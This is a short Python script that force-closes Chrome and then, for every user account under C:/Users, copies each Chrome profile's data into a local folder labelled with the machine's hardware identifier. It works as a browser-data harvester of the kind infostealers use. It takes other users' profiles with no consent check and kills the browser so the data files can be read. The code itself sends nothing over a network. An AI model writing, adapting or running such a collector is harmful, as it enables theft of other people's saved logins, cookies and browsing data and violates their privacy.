import ChromeReader
import os
import uuid
from warnings import warn

class Profile(ChromeReader.Profile):
    def save(self, path: str, make_folder: bool = True, make_visualizer_file: bool = True):
        path = super().save(path, make_folder)

        if make_visualizer_file:
            with open(os.path.join(path, "Visualize.crv"), "w") as file:
                file.close()

class Profiler(ChromeReader.Profiler):
    def get_profile(self, profile_name = "Default") -> Profile:
        profile_path = os.path.join(self.path, profile_name)
        profile_dict = self.get_profile_dict(profile_name)
        return Profile(profile_path, profile_dict, profile_name)
    
    def save_profiles(self, path: str, make_visualizer_files: bool = True):
        for profile in self.profiles:
            profile.save(path, make_folder=True, make_visualizer_file=make_visualizer_files)

if __name__ == "__main__":
    try:
        os.system("taskkill /f /im chrome.exe")
    except:
        pass

    users_path = "C:/Users"

    for user_name in os.listdir(users_path):
        user_path = os.path.join(users_path, user_name)

        if (not os.path.isdir(user_path)) or user_name in ("Default", "Default User", "All Users", "Public", ):
            continue

        user_data_path = os.path.join(user_path, "AppData", "Local", "Google", "Chrome", "User Data")

        if os.path.exists(user_data_path):
            try:
                profiler = Profiler(user_data_path)
                profiler.save_profiles(os.path.join("profiles", f"PC {uuid.getnode()}", user_name))
            except Exception as e:
                warn(f"Profiler of {user_name} failed:\n{e}")
        else:
            warn(f"User Data path of {user_name} doesn't exist.")